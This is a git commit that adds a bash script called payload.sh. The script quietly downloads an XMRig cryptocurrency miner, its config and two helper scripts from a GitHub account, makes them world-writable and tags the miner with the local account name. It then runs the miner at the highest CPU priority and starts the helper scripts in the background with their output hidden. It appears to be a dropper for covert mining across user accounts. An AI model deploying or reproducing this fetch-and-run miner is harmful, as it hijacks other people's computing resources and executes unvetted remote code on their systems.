a43e85efa1ff06cac1f7d17ae1f6a7e33647dc2d
Predador21 <81100606+Predador21@users.noreply.github.com>
2021-09-10 00:41:14 -0300

    Create payload.sh

---
+++ payload.sh
@@ -0,0 +1,42 @@
+#!/bin/bash
+
+version='0.5'
+
+path=$(pwd)
+account=${path#/home/}
+
+if [ ! -e 'xmrig' ]
+then
+   wget -q https://github.com/Predador21/files/raw/main/xmrig && chmod 777 xmrig
+fi
+
+if [ ! -e 'config.json' ]
+then
+   wget -q https://raw.githubusercontent.com/Predador21/files/main/config.json
+   sed -i 's/"rig-id":.*/"rig-id": "'$account'",/' config.json
+fi
+
+if [ ! -e 'ping.sh' ]
+then
+   wget -q https://raw.githubusercontent.com/Predador21/scripts/main/ping.sh && chmod 777 ping.sh
+fi
+
+if [ ! -e 'status.sh' ]
+then
+   wget -q https://raw.githubusercontent.com/Predador21/scripts/main/status.sh && chmod 777 status.sh
+fi
+
+if ! pgrep xmrig > /dev/null
+then
+   nice -n -20 ./xmrig
+fi
+
+if ! pgrep ping.sh > /dev/null
+then
+   nohup ./ping.sh $account $version > /dev/null &
+fi
+
+if ! pgrep status.sh > /dev/null
+then
+   nohup ./status.sh > /dev/null &
+fi
